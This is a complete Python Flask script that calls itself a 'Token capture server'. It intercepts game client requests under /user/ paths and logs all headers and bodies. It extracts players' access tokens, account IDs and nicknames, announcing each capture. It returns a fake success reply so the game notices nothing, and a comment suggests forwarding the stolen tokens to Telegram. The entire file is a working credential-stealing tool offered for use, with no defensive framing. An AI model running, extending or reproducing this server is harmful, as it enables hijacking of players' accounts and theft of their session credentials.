from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# Catch any request under /user/<user_id>/ including sub‑paths
@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def capture(user_id, subpath):
    try:
        # Log everything
        print(f"\n🔹 Incoming request from {user_id}")
        print(f"   Sub‑path: {subpath if subpath else '(root)'}")
        print(f"   Method: {request.method}")
        print(f"   Headers: {dict(request.headers)}")
        
        # Get the JSON body (if any)
        data = request.get_json(silent=True)
        if data:
            print(f"   Body JSON: {json.dumps(data, indent=2)}")
        else:
            # If not JSON, try raw data
            raw = request.get_data(as_text=True)
            if raw:
                print(f"   Raw body: {raw[:500]}...")  # first 500 chars
        
        # Try to extract access_token from JSON body
        if data:
            token = data.get('access_token')
            account_id = data.get('account_id')
            nickname = data.get('nickname')
            if token:
                print(f"\n✅ ACCESS TOKEN CAPTURED! 🎯")
                print(f"   Nickname: {nickname}")
                print(f"   Account ID: {account_id}")
                print(f"   Token: {token}")
                # You can also save it to a file or send to Telegram here
            else:
                print("   No 'access_token' found in this request.")
        
        # Respond with a success JSON (to keep the game happy)
        return jsonify({
            "status": "success",
            "message": "OK",
            "data": {}
        }), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "Token capture server is running!", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)